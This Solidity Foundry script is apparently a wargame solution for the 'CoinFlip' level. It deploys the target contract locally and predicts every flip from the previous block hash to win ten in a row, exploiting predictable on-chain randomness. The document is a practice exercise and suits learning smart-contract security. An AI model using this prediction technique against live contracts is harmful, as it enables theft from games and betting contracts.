// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract CoinFlipHack is Script {
    using SafeMath for uint256;

    CoinFlip public coinFlip;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public flipCounts;

    function run() public {
        coinFlip = new CoinFlip();

        vm.roll(1024);

        uint256 result;
        bool guess;

        for (uint256 i; i < 10; i++) {
            vm.roll(1024 + i);
            result = uint256(blockhash(block.number.sub(1))).div(FACTOR);
            guess = result == 1 ? true : false;
            if (coinFlip.flip(guess)) {
                flipCounts++;
            }
        }

        console.log("flip counts:", flipCounts);
        console.log("consecutiveWins is:", coinFlip.consecutiveWins());
    }
}
